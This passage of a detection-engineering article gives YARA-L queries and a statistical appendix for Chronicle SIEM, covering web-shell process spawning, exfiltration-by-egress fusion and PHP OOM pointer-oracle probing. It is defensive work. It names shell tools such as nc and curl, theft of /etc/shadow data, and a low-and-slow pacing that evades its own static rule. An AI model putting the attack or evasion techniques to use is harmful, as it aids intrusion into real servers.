$host = $parent_window_totals.host
$parent = $child_transition.parent
$parent = $pair_window_totals.parent
$parent = $parent_window_totals.parent
$child = $child_transition.child
$child = $pair_window_totals.child
$ws = $child_transition.window_start

match:
  $host, $parent, $child, $ws by 1d

outcome:
  $transition_launches = max($child_transition.transition_count)
  $window_pair_launches = max($pair_window_totals.total_pair_launches)
  $window_parent_launches = max($parent_window_totals.total_parent_launches)
  $sample_commands = array_distinct($child_transition.sample_command)

  // Laplace-Smoothed Conditional Transition Probability & Surprisal (V = 100.0)
  $transition_prob = ($window_pair_launches + 1.0) / ($window_parent_launches + 100.0)
  $markov_threat_score = math.log(($window_parent_launches + 100.0) / ($window_pair_launches + 1.0))

  // 6 Core Evidence Pillars
  $observation_count = $transition_launches
  $baseline_active_samples = $window_parent_launches
  $baseline_mean = $transition_prob
  $baseline_dispersion = $markov_threat_score
  $fleet_prevalence = 0 - 1
  $distinct_binaries = 1

condition:
  $window_parent_launches >= 10
  and $markov_threat_score >= 3.0

order:
  $markov_threat_score desc
```

#### Query 8B: 4-Stage Union-Spine Roll-Up Sector Fusion (`EXECUTION_TO_EXFILTRATION`, 30-Day UEBA)
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// ARCHITECTURE: 4-STAGE ROLL-UP SECTOR FUSION (COMPOSITE-ONLY METRIC + ENTITY-KEYED METRIC)
// Goal: Fuse 30-day process execution anomalies (file_executions_total) with outbound network egress (network_bytes_outbound) on a shared entity-union spine.
// Statistical Model: Roll-Up Multi-Sector Threat Fusion with K-Key Multiplicity Offset (rollup_sector_fusion_4stage.yl2)
// ADVISORY: Sector A rolls file_executions_total up from per-(metadata.event_type, principal.process.file.sha256) baselines:
//           its Z is the largest per-binary Z for the host minus sqrt(2 * ln(K_eff)), not a Z of the host's total execution volume.
//           Note (WS7-03): sqrt(2 * ln(K_eff)) approximates the Gaussian expected maximum across K_eff active sub-keys
//           (not a Bonferroni correction), and fusion false-positive rates also depend on inter-sector correlation.
// Template: secops-risk-metrics-multistage/templates/pipelines/rollup_sector_fusion_4stage.yl2
// ============================================================================

stage sector_a_detail {
    ((metadata.event_type = "PROCESS_LAUNCH" and principal.process.file.sha256 != "") or (network.sent_bytes > 0 and network.sent_bytes < 1000000000000000))
    principal.asset.hostname = $entity
    $entity != ""
    metadata.event_type = $event_type
    principal.process.file.sha256 = $principal_process_file_hash

  match:
    $entity, $event_type, $principal_process_file_hash by 1d

  outcome:
    $d_obs = sum(if(metadata.event_type = "PROCESS_LAUNCH" and principal.process.file.sha256 != "", 1, 0))
    $d_avg = max(metrics.file_executions_total(
        period: 1d, window: 30d, metric: event_count_sum, agg: avg,
        principal.asset.hostname: principal.asset.hostname,
        metadata.event_type: metadata.event_type,
        principal.process.file.sha256: principal.process.file.sha256
    ))
    $d_std = max(metrics.file_executions_total(
        period: 1d, window: 30d, metric: event_count_sum, agg: stddev,
        principal.asset.hostname: principal.asset.hostname,
        metadata.event_type: metadata.event_type,
        principal.process.file.sha256: principal.process.file.sha256
    ))
    $d_days = max(metrics.file_executions_total(
        period: 1d, window: 30d, metric: event_count_sum, agg: num_metric_periods,
        principal.asset.hostname: principal.asset.hostname,
        metadata.event_type: metadata.event_type,
        principal.process.file.sha256: principal.process.file.sha256
    ))
    $d_floor_base = if($d_avg > 1.0, $d_avg, 1.0)
    $d_floor = math.sqrt($d_floor_base)
    $d_safe_std = if($d_std > $d_floor, $d_std, $d_floor)
    $d_z_raw = ($d_obs - $d_avg) / $d_safe_std
    $d_z_pos = if($d_z_raw > 0, $d_z_raw, 0.0)
    $d_z = if($d_obs > 0 and $d_days >= 7, $d_z_pos, 0.0)
    $d_hot = if($d_obs > 0 and $d_days >= 7 and $d_z_raw >= 3.0, 1, 0)
    $d_novel = if($d_obs > 0 and $d_days = 0, 1, 0)
    $d_active = if($d_obs > 0, 1, 0)
}

stage sector_a {
    $entity = $sector_a_detail.entity

  match:
    $entity by 1d

  outcome:
    $a_obs = sum($sector_a_detail.d_obs)
    $a_keys = count_distinct($sector_a_detail.principal_process_file_hash)
    $a_active_keys = sum($sector_a_detail.d_active)
    $a_hot_keys = sum($sector_a_detail.d_hot)
    $a_novel_keys = sum($sector_a_detail.d_novel)
    $a_days = max($sector_a_detail.d_days)
    $z_a_max = max($sector_a_detail.d_z)
    $k_eff = if($a_active_keys > 1, $a_active_keys, 1)
    $multiplicity_offset = math.sqrt(2.0 * math.log($k_eff))
    $z_a_adj = $z_a_max - $multiplicity_offset
    $z_a = if($z_a_adj > 0.0, $z_a_adj, 0.0)
}

stage sector_b {
    ((metadata.event_type = "PROCESS_LAUNCH" and principal.process.file.sha256 != "") or (network.sent_bytes > 0 and network.sent_bytes < 1000000000000000))
    principal.asset.hostname = $entity
    $entity != ""

  match:
    $entity by 1d

  outcome:
    $b_obs = sum(if(network.sent_bytes > 0 and network.sent_bytes < 1000000000000000, 1.0, 0.0) * network.sent_bytes)
    $b_avg = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: avg,
        principal.asset.hostname: principal.asset.hostname
    ))
    $b_std = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: stddev,
        principal.asset.hostname: principal.asset.hostname
    ))
    $b_days = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: num_metric_periods,
        principal.asset.hostname: principal.asset.hostname
    ))
}

$entity = $sector_a.entity
$entity = $sector_b.entity
$ws = $sector_a.window_start
$ws = $sector_b.window_start

match:
  $entity, $ws by 1d

outcome:
  $a_observed = max($sector_a.a_obs)
  $a_keys = max($sector_a.a_keys)
  $a_hot_keys = max($sector_a.a_hot_keys)
  $a_novel_keys = max($sector_a.a_novel_keys)
  $b_observed = max($sector_b.b_obs)
  $b_avg = max($sector_b.b_avg)
  $b_std = max($sector_b.b_std)
  $b_active_days = max($sector_b.b_days)

  // Rectified, baseline-gated, multiplicity-adjusted sector scores (missing sector contributes 0.0)
  $z_a = max($sector_a.z_a)
  $b_safe_std = if($b_std > 44979.0, $b_std, 44979.0)
  $z_b_raw = ($b_observed - $b_avg) / $b_safe_std
  $z_b_pos = if($z_b_raw > 0.0, $z_b_raw, 0.0)
  $z_b = if($b_observed > 0 and $b_active_days >= 7, $z_b_pos, 0.0)

  // Euclidean Vector Threat Norm: D_sq = Z_a^2 + Z_b^2 (Gate: D >= 3.5σ <=> D_sq >= 12.25)
  $z_a_sq = $z_a * $z_a
  $z_b_sq = $z_b * $z_b
  $composite_threat_norm_sq = $z_a_sq + $z_b_sq

condition:
  $composite_threat_norm_sq >= 12.25

order:
  $composite_threat_norm_sq desc
```

---

### Scenario 9: OOM Bailout & Blind Pointer-Comparison Oracle Probing

#### A. Baseline Static YARA-L 2.0 Rule
To leak memory via the blind pointer-comparison (`*ptr`) oracle, an attacker interleaves repeated HTTP 500 OOM bailouts with HTTP 200 comparison probes:

```yara
rule network_php_oom_uaf_oracle_probing {
  meta:
    description = "Detects >= 5 HTTP 500 OOM bailouts interleaved with >= 20 HTTP 200 POST probes from the same client IP over 2m."
    severity = "High"
    mitre_tactic = "TA0009"
    mitre_technique = "T1190"

  events:
    $oom.metadata.event_type = "NETWORK_HTTP"
    $oom.network.http.method = "POST"
    $oom.network.http.response_code = 500
    $oom.network.sent_bytes >= 262144
    re.regex($oom.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $client_ip = $oom.principal.ip
    $target_ip = $oom.target.ip

    $probe.metadata.event_type = "NETWORK_HTTP"
    $probe.network.http.method = "POST"
    $probe.network.http.response_code = 200
    $probe.network.sent_bytes >= 2048
    re.regex($probe.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $probe.principal.ip = $client_ip
    $probe.target.ip = $target_ip

  match:
    $client_ip, $target_ip over 2m

  condition:
    #oom >= 5 and #probe >= 20
}
```

#### B. Where the Static Rule Struggles
1. **Low-and-Slow Pacing Evasion**: Spacing requests to 3 OOM bailouts and 12 probes every 2 minutes completely evades `#oom >= 5 and #probe >= 20`.
2. **Scanner False Positives**: Automated DAST scanners and load tests generate bursts of 500s and 200s across dozens of endpoints.

#### C. Whole UEBA Harness Query

* **Query 9 (`beta_binomial_failure_4stage.yl2`)**: Updates a $\text{Beta}(\alpha_0 = 1.0, \beta_0 = 19.0)$ hyperprior ($\sim 5\%$ baseline failure rate) with each client's **Leave-One-Out** historical failures and successes, then scores the current hour's OOM bailouts against the exact **Beta-Binomial Predictive Variance** ($Z_{\text{fail}} \ge 3.0\sigma$) while tracking `$distinct_binaries` (distinct target IPs probed) and `$fleet_prevalence` (concurrent clients with $\ge 3$ OOM failures).

#### Query 9: Leave-One-Out Conjugate Beta-Binomial Predictive Failure Z-Score on Oracle Probing
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Hunt for interleaved HTTP 500 OOM bailouts and HTTP 200 pointer-oracle probes via Leave-One-Out Beta-Binomial Predictive Standardization.
// Statistical Model: Leave-One-Out Conjugate Beta-Binomial Updating & Predictive Failure Z-Score (beta_binomial_failure_4stage.yl2)
// Template: secops-statistical-hunter/templates/pipelines/beta_binomial_failure_4stage.yl2
// ============================================================================

stage entity_hourly_trials {
    $e.metadata.event_type = "NETWORK_HTTP"
    $e.network.http.method = "POST"
    $e.network.sent_bytes >= 2048
    re.regex($e.target.url, `(?i)(\.php(\b|$|\?)|/sites/default/|/\?q=)`)
    $user = $e.principal.ip
    $user != ""

  match:
    $user by 1h

  outcome:
    $total_trials = count($e.metadata.id)
    $failed_trials = sum(if($e.network.http.response_code = 500 and $e.network.sent_bytes >= 65536, 1, 0))
    $distinct_sources = count_distinct($e.target.ip)
}

stage entity_historical_rates {
    $user = $entity_hourly_trials.user

  match:
    $user

  outcome:
    $total_historical_events = sum($entity_hourly_trials.total_trials)
    $total_historical_fails = sum($entity_hourly_trials.failed_trials)
    $active_hours = count($entity_hourly_trials.window_start)
}

stage fleet_stats {
    $ws = $entity_hourly_trials.window_start

  match:
    $ws by 1h

  outcome:
    $fleet_users = sum(if($entity_hourly_trials.failed_trials >= 3, 1, 0))
}

$user = $entity_hourly_trials.user
$user = $entity_historical_rates.user
$ws = $entity_hourly_trials.window_start
$ws = $fleet_stats.ws

match:
  $user, $ws by 1h

outcome:
  $observation_count = max($entity_hourly_trials.failed_trials)
  $hourly_trials_count = max($entity_hourly_trials.total_trials)
  $safe_trials = if($hourly_trials_count > 0, $hourly_trials_count, 1)
  $baseline_active_samples = max($entity_historical_rates.active_hours)
  $fleet_prevalence = max($fleet_stats.fleet_users)
  $distinct_binaries = max($entity_hourly_trials.distinct_sources)

  // Leave-One-Out Beta Prior (alpha_0 = 1.0, beta_0 = 19.0) & Beta-Binomial Predictive Standardization
  $raw_prior_fails = max($entity_historical_rates.total_historical_fails) - $observation_count
  $prior_fails = if($raw_prior_fails > 0, $raw_prior_fails, 0)
  $raw_prior_events = max($entity_historical_rates.total_historical_events) - $hourly_trials_count
  $prior_events = if($raw_prior_events > $prior_fails, $raw_prior_events, $prior_fails)
  $prior_succ = $prior_events - $prior_fails
  $alpha_prior = 1.0 + $prior_fails
  $beta_prior = 19.0 + $prior_succ
  $prior_total = $alpha_prior + $beta_prior
  $baseline_mean = $alpha_prior / $prior_total
  $posterior_fail_prob = ($alpha_prior + $observation_count) / ($prior_total + $safe_trials)
  $pred_var = $safe_trials * $baseline_mean * (1.0 - $baseline_mean) * (($prior_total + $safe_trials) / ($prior_total + 1.0))
  $safe_pred_var = if($pred_var > 0.25, $pred_var, 0.25)
  $baseline_dispersion = math.sqrt($safe_pred_var)
  $fail_z = ($observation_count - ($safe_trials * $baseline_mean)) / $baseline_dispersion

condition:
  $baseline_active_samples >= 1
  and $hourly_trials_count >= 15
  and $observation_count >= 3
  and $fail_z >= 3.0

order:
  $fail_z desc
```

---

## 3. Appendix: A Practitioner’s Plain-English Guide to the Statistical Models

Security telemetry is messy: some servers are dead quiet for months, some are noisy every hour, and some behaviors look suspicious on one machine but are completely normal across a 20-person developer team. No single formula solves every problem. Below is an intuitive guide to what each statistical model in this article actually does and why it closes specific detection gaps.

---

### 3.1 Zipfian Power-Law Process Rarity (`zipfian_process_rarity_2stage.yl2`)
* **Plain-English Analogy**: *"The Heavy Head vs. The Long Tail"*
* **What "Zipfian" Means**: Named after linguist George Kingsley Zipf, Zipf's Law observes that in almost any human or computer system, a tiny handful of items happen constantly while a massive "long tail" of rare items happen almost never. Across an enterprise server fleet:
  ```
  Executions
    ▲
    │ ██  <-- "The Head": sshd, cron, php-fpm (1,000s of hosts, millions of runs)
    │ ██
    │ ██  ██  <-- "The Middle": Dev tools, CI debug flags (15–50 dev hosts)
    │ ██  ██  ██
    │ ██  ██  ██  ▄▄  ▄▄  ▁▁  ▁▁  ..  ..  <-- "The Zipfian Tail": 1–2 hosts in the entire fleet
    └────────────────────────────────────────► Process / Flag Rank
  ```
* **The Gap It Solves**: When hunting for dangerous debug flags like `apache2 -X`, a static rule either fires on all 30 developers who use `-X` in testing (alert fatigue) or forces you to write a super-narrow regex (creating an evasion blind spot).
* **How the Math Works**:
  1. Stage 1 & Stage 2 count `$adopter_hosts` (how many machines in the company ran this binary/flag), while Stage 3 (`fleet_host_total`) counts `$fleet_total_hosts` (total active `PROCESS_LAUNCH` hosts across the fleet).
  2. The Root Stage computes pure **Host-Prevalence Inverse Document Frequency (IDF)**:
     $$\text{Zipf Rarity Score} = \ln\!\left(\frac{\max(N_{\text{fleet}}, N_{\text{adopters}})}{\max(N_{\text{adopters}}, 1)}\right) \ge 2.0$$
  3. By gating on `$safe_fleet_hosts >= 10` and `$adopter_hosts <= 2`, any tool used across a 15-person dev cohort is suppressed, while an attacker spawning `httpd -X` on an isolated production server (`adopter_hosts = 1` across `100` fleet hosts, $\ln(100/1) = 4.61 \ge 2.0$) surfaces immediately without conflating single-host execution frequency with fleet rarity.

---

### 3.2 Two-Part Hurdle Model (`two_part_hurdle_2stage.yl2`)
* **Plain-English Analogy**: *"The Motion Sensor in the Vault vs. The Lobby Traffic Counter"*
* **The Gap It Solves**: Standard Z-scores ($Z = (x - \mu)/\sigma$) break down when an event almost never happens (known in statistics as **zero-inflation**). For example, how often does a production web server modify `php.ini` or trigger `systemd-coredump`? Zero times a day ($\mu = 0, \sigma = 0$). Conversely, a staging server might segfault or get reconfigured several times a day.
* **How the Math Works**: A Two-Part Hurdle splits entities into two separate regimes using a single raw stage and an `if()` switch:
  1. **Part 1 — The Discrete Dormancy Hurdle**: Did this host have $\le 2$ active days of this behavior in the lookback window? If yes, the host is **dormant** (like a bank vault at midnight). Crossing from `0` to `1` event awards a discrete awakening score (`3.0 * $observation_count`), crossing $H \ge 3.0$ on the very first event.
  2. **Part 2 — Leave-One-Out Continuous Intensity Standardization**: If the host was active on $> 2$ days (like a noisy staging server), the query subtracts today's count from the active-day sums ($n_{\text{prior}} = \max(N_{\text{active}} - 1, 1)$) and scores positive-rectified Leave-One-Out Z-score intensity with a Poisson count dispersion floor:
     $$Z_{\text{LOO}} = \max\!\left(0,\; \frac{\text{Observed} - \mu_{\text{LOO}}}{\sqrt{\max(\sigma_{\text{LOO}}^2,\; \max(\mu_{\text{LOO}}, 1.0))}}\right) \ge 3.0$$
     Now that noisy server only alerts if today's volume is a genuine spike above its own prior active-day chatter.

---

### 3.3 Parametric Standard Z-Score on 30-Day UEBA (`standard_z_score_2stage.yl2`)
* **Plain-English Analogy**: *"The Personal 30-Day Yardstick"*
* **The Gap It Solves**: A static rule that alerts when a server sends `> 100 MB` outbound will miss a quiet microservice leaking `15 MB` of `/etc/shadow` data, while firing constantly on a high-traffic media server that sends `50 GB` every day.
* **How the Math Works**: Google SecOps Risk Analytics pre-computes a 30-day rolling mean ($\mu_{30d}$), standard deviation ($\sigma_{30d}$), and active-day count (`num_metric_periods`) for every host and user across core telemetry tables (`metrics.network_bytes_outbound`, `metrics.http_queries_fail`, etc.). Enforcing a **7-active-day maturity gate** (`$active_days >= 7`) and domain-appropriate dispersion floors—$\max(\sigma_{30d}, \sqrt{\max(\mu_{30d}, 1.0)})$ for count metrics and the fleet byte dispersion floor (`44,979.0` B for `network_bytes_outbound`)—the query computes:
  $$Z = \frac{\text{Observed}_{24h} - \mu_{30d}}{\max(\sigma_{30d}, \text{dispersion floor})} \ge 3.0$$
  A score of $Z \ge 3.0\sigma$ means the observed 24-hour volume exceeds that server's own mature 30-day baseline by at least three standard deviations, regardless of whether the server normally sends kilobytes or terabytes.

---

### 3.4 Leave-One-Out Discrete Poisson Rarity (`poisson_rare_surge_2stage.yl2`)
* **Plain-English Analogy**: *"Counting Lightning Strikes Without Letting Today's Storm Skew the Historical Average"*
* **The Gap It Solves**: Rare administrative commands (`setarch -R`, `seccomp=unconfined`) happen as discrete, low-count arrivals. If you calculate a standard average over a 14-day window *that includes today's attack spike*, today's spike inflates the mean and standard deviation—masking itself ("self-contamination").
* **How the Math Works**:
  1. **Host Maturity & Latest-Day Pinning**: Stage 3 (`host_online_baseline`) counts distinct online UTC days (`$online_days >= 7`) across general `PROCESS_LAUNCH` telemetry so newly provisioned containers do not false-positive, and pins scoring to the host's latest active day (`$is_latest_day = 1`).
  2. **Leave-One-Out Arrival Rate ($\lambda$)**: Over a 14-day Mode B window, it subtracts today's count ($k$) from total runs across the window and divides by the **13 prior calendar days** (with Jeffreys $+0.5$ smoothing):
     $$\lambda = \frac{\max(\text{Total}_{\text{hist}} - k, 0) + 0.5}{13.0}$$
  3. **Poisson Score Statistic ($Z^2$)**: In a Poisson process, theoretical variance equals the mean ($\sigma^2 = \lambda$), yielding squared deviance directly:
     $$Z_{\text{Poisson}}^2 = \frac{(k - \lambda)^2}{\max(\lambda, 0.01)} \ge 12.25 \quad (\text{equivalent to } Z \ge 3.5\sigma \text{ when } k > \lambda)$$

---

### 3.5 Zero-Inclusive Poisson Dispersion & The Fano Factor (`poisson_burst_clustering_2stage.yl2`)
* **Plain-English Analogy**: *"A Steady All-Day Drizzle vs. A 5-Minute Flash Flood"*
* **The Gap It Solves**: Suppose Server A receives 240 file uploads spread evenly across 24 hours (10 per hour). Server B sits idle for 23 hours and then gets slammed with 240 `PHP_SESSION_UPLOAD_PROGRESS` POST requests in a single hour. Both servers have the exact same daily total (`240`) and the exact same 24-hour average ($\mu = 10$/hr). Meanwhile, computing `stddev()` over *non-empty buckets only* would collapse a single-hour burst to $\sigma = 0$!
* **How the Math Works**: Stage 2 accumulates $\sum x$ and $\sum x^2$ across active hours, and the Root Stage reconstructs the **Zero-Inclusive Mean and Variance** across all $T = 24$ hourly buckets (treating silent hours as `0`):
  $$\mu = \frac{\sum x}{24.0}, \qquad \sigma^2 = \max\!\left(0,\; \frac{\sum x^2}{24.0} - \mu^2\right), \qquad F = \frac{\sigma^2}{\mu}$$
  * For steady random traffic (a homogeneous Poisson process), variance equals the mean, so **$F \approx 1.0$**.
  * For a concentrated exploit burst (23 silent hours and 1 hour with 240 requests), $\mu = 10$ while $\sigma^2 = 2300$, driving **$F = 230 \gg 4.0$** and exposing even a single-hour seeding wave without a hardcoded `#seed >= 50` cutoff.

---

### 3.6 Median Absolute Deviation (MAD) & Modified Z-Score (`mad_modified_z_4stage.yl2`)
* **Plain-English Analogy**: *"The Distortion-Proof Yardstick That Ignores One-Off Historical Spikes"*
* **The Gap It Solves**: If a billionaire walks into a coffee shop of 10 people, the *average* net worth in the room jumps to \$100M, but the *median* net worth barely moves. Similarly, if a web server had one noisy maintenance day last week, its arithmetic mean ($\mu$) and standard deviation ($\sigma$) become bloated—blinding standard Z-scores to a subtle 12 KB HTTP 500 heap-memory leak today.
* **How the Math Works**:
  1. Stage 2 computes the **Median** ($\tilde{x}$) of daily maximum HTTP 500 response sizes across active error days (`$baseline_active_samples >= 7`).
  2. Stage 3 computes the **MAD**—the median absolute distance from the median (`window.median(..., false)` so zero-deviation days at the median are preserved):
     $$\text{MAD} = \text{median}\left(|x_i - \tilde{x}|\right)$$
  3. The Root Stage computes the **Iglewicz-Hoaglin Modified Z-Score**, falling back to scaled Mean Absolute Deviation ($1.253314 \times \text{meanAD}$) when $\text{MAD} = 0$ (e.g., a static error page) and `512.0` B when history is perfectly constant:
     $$M_Z = \frac{\text{Observed} - \tilde{x}}{\text{scale}} > 3.5$$
  4. **Operational Caveats**: Days with zero HTTP 500 responses emit no Stage 1 row (so median/MAD reflect active error days only), and the scored day is included in the window (bounded by the median's 50% breakdown point over $\ge 7$ active days).

---

### 3.7 Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal (`markov_2gram_transition_rarity_2stage.yl2`)
* **Plain-English Analogy**: *"Measuring How 'Surprised' a Parent Process Is by the Child It Just Spawned"*
* **The Gap It Solves**: Static web-shell rules try to list every bad child binary (`sh`, `bash`, `nc`, `curl`) and every bad command-line flag, while manually excluding noisy legacy helpers (`sendmail`, `wkhtmltopdf`). If an attacker runs a command that isn't on the regex list, the rule misses it.
* **How the Math Works**: Instead of inspecting command-line text or scoring a single isolated day, Stages 2 and 3 accumulate whole-window pair launches ($N_{\text{pair}}$) and whole-window parent launches ($N_{\text{parent}}$) on each host, applying **Laplace Vocabulary Smoothing** ($V = 100.0$):
  $$P(\text{Child} \mid \text{Parent}) = \frac{N_{\text{pair}} + 1.0}{N_{\text{parent}} + 100.0}, \qquad I = -\ln P(\text{Child} \mid \text{Parent}) = \ln\!\left(\frac{N_{\text{parent}} + 100.0}{N_{\text{pair}} + 1.0}\right)$$
  * If `php-fpm` spawns `sendmail` 990 times out of 1,000 child launches across the window, $I = \ln(1100 / 991) = 0.10 \ll 3.0$ and quiets itself automatically.
  * If `php-fpm` spawns `/bin/bash` or `/usr/bin/id` once out of 1,000 child launches, $I = \ln(1100 / 2) = 6.31 \ge 3.0$, catching the RCE smoothly without arbitrary step-function multipliers or command-line regex lists.

---

### 3.8 Multi-Sector Roll-Up Threat Fusion (`rollup_sector_fusion_4stage.yl2`)
* **Plain-English Analogy**: *"Combining Two Sub-Threshold Whispers into One High-Confidence Alert"*
* **The Gap It Solves**: Skilled adversaries keep each stage of post-exploitation below single-metric gates, while `metrics.file_executions_total` is a composite-only metric keyed per `(hostname, event_type, sha256)` with no host-wide baseline. Furthermore, joining two raw stages directly on independent filters would drop single-sector bursts if one side had zero rows.
* **How the Math Works**:
  1. **Shared Entity-Union Spine & Multiplicity Offset**: Both `sector_a_detail` and `sector_b` match the union of execution and outbound-byte events so single-sector spikes survive with `0.0` on the quiet sector. Stage 2 (`sector_a`) takes the peak mature per-binary Z-score ($\ge 7$ active days, $\sqrt{\max(\mu, 1.0)}$ floor) and subtracts the Gaussian extreme-value multiplicity offset across $K_{\text{eff}} = \max(K_{\text{active}}, 1)$ active binaries:
     $$Z_{\text{exec}} = \max\!\left(0,\; \max_k(Z_k) - \sqrt{2 \ln K_{\text{eff}}}\right)$$
  2. **Rectified Euclidean Threat Norm ($D^2$)**: Root combines $Z_{\text{exec}}$ with mature outbound byte $Z_{\text{egress}}$ (`44,979.0` B floor, $\ge 7$ active days):
     $$D^2 = Z_{\text{exec}}^2 + Z_{\text{egress}}^2 \ge 12.25 \quad (D \ge 3.5\sigma)$$
     Note that $\sqrt{2\ln K_{\text{eff}}}$ approximates the expected Gaussian maximum across $K_{\text{eff}}$ sub-keys (not a Bonferroni bound), and operational alert rates also depend on inter-sector correlation between process launches and network egress.

---

### 3.9 Leave-One-Out Conjugate Beta-Binomial Standardization (`beta_binomial_failure_4stage.yl2`)
* **Plain-English Analogy**: *"Batting Averages: Why Going 1-for-1 Doesn't Make You a 1.000 Hitter"*
* **The Gap It Solves**: When hunting for HTTP 500 OOM oracle probing, raw error percentages ($\text{fails} / \text{total}$) explode on small numbers, while fixed posterior-rate cutoffs fail to adapt to clients with genuinely higher historical error rates or large sample sizes.
* **How the Math Works**: Stage 2 accumulates each client's historical trials and failures, and the Root Stage subtracts the current hour's trials ($n$) and failures ($k$) to form a **Leave-One-Out $\text{Beta}(\alpha_{\text{prior}}, \beta_{\text{prior}})$ Prior** starting from $\alpha_0 = 1.0, \beta_0 = 19.0$ ($\sim 5\%$ baseline failure rate, $M = \alpha_{\text{prior}} + \beta_{\text{prior}}$, $p_0 = \alpha_{\text{prior}} / M$). It then standardizes $k$ against the exact **Beta-Binomial Predictive Variance**:
  $$\sigma_{\text{pred}}^2 = \max\!\left(0.25,\; n \, p_0 (1 - p_0) \frac{M + n}{M + 1}\right), \qquad Z_{\text{fail}} = \frac{k - n p_0}{\sqrt{\sigma_{\text{pred}}^2}} \ge 3.0$$
  * **1 fluke error out of 1 request**: Fails both the trial gate (`$hourly_trials_count >= 15`) and failure gate (`$observation_count >= 3`).
  * **10 OOM bailouts out of 25 requests on a clean client** ($p_0 = 1/20 = 0.05$, $M = 20$): Expected failures $n p_0 = 1.25$, predictive SD $\sigma_{\text{pred}} = \sqrt{2.54} = 1.59$, yielding **$Z_{\text{fail}} = (10 - 1.25) / 1.59 = 5.49\sigma \ge 3.0\sigma$**, cleanly surfacing paced oracle probing.

---

### 3.10 Non-Parametric Quantiles (`window.percentile`), Bowley Skewness & HTTP Response Payload Shape ($P_{50}$ vs $P_{90}$)

When an attacker interacts with a staged `php2shell` webshell or triggers a PHP heap/database dump over HTTP, most keepalive and navigation requests return small responses (`$q50`), whereas command-output dumps inflate the upper tail (`$p90`) and right-skew the intra-hour response size distribution (`$bowley_skew > 0.40`, `$tail_to_median_ratio = $p90 / $safe_q50 >= 10.0`) above a continuous relative IQR floor ($\max(Q_{75} - Q_{25}, \max(0.01 \times Q_{50}, 1.0))$). Using `window.percentile(network.received_bytes, P)`, we fingerprint this intra-hour payload shape deformation directly on `NETWORK_HTTP` events:

#### Query 10 (Appendix): Intra-Hour HTTP Response Payload Quantile Shape & Bowley Skewness
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect webshell or HTTP response payload quantile shape anomalies ($p50 vs $p90 and Bowley skewness) over 1h windows.
// Statistical Model: Non-Parametric Empirical Quantiles & Bowley Quartile Skewness (window.percentile)
// ============================================================================

stage stage1_http_shape {
    metadata.event_type = "NETWORK_HTTP"
    network.received_bytes > 0
    target.hostname = $vhost
    principal.ip = $client_ip
    $vhost != ""
    $client_ip != ""

  match:
    $vhost, $client_ip by 1h

  outcome:
    $req_count = count(metadata.id)
    $distinct_uris = count_distinct(target.url)
    $sample_uris = array_distinct(target.url)
    $p25_bytes = window.percentile(network.received_bytes, 25)
    $p50_bytes = window.percentile(network.received_bytes, 50)
    $p75_bytes = window.percentile(network.received_bytes, 75)
    $p90_bytes = window.percentile(network.received_bytes, 90)
}

$vhost = $stage1_http_shape.vhost
$client_ip = $stage1_http_shape.client_ip
$ws = $stage1_http_shape.window_start

match:
  $vhost, $client_ip, $ws by 1h

outcome:
  $requests = max($stage1_http_shape.req_count)
  $q25 = max($stage1_http_shape.p25_bytes)
  $q50 = max($stage1_http_shape.p50_bytes)
  $q75 = max($stage1_http_shape.p75_bytes)
  $p90 = max($stage1_http_shape.p90_bytes)

  // Continuous relative IQR floor max(Q75 - Q25, max(0.01 * Q50, 1.0)) & Bowley Skewness
  $iqr = $q75 - $q25
  $rel_floor = 0.01 * $q50
  $iqr_floor = if($rel_floor > 1.0, $rel_floor, 1.0)
  $safe_iqr = if($iqr > $iqr_floor, $iqr, $iqr_floor)
  $bowley_skew = ($q75 + $q25 - (2.0 * $q50)) / $safe_iqr

  $safe_q50 = if($q50 > 1.0, $q50, 1.0)
  $tail_to_median_ratio = $p90 / $safe_q50

  // 6 Core Evidence Pillars
  $observation_count = $p90
  $baseline_active_samples = $requests
  $baseline_mean = $q50
  $baseline_dispersion = $iqr
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($stage1_http_shape.distinct_uris)
  $sample_commands = array_distinct($stage1_http_shape.sample_uris)

condition:
  $requests >= 10
  and $bowley_skew > 0.40
  and $tail_to_median_ratio >= 10.0

order:
  $tail_to_median_ratio desc
```

---

## 📜 License
This project is licensed under the [Apache License 2.0](LICENSE).
```
Copyright 2026 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0
```

---
*Created and maintained by Greg Kushmerek for Google Security Operations (Chronicle SIEM & SOAR).*
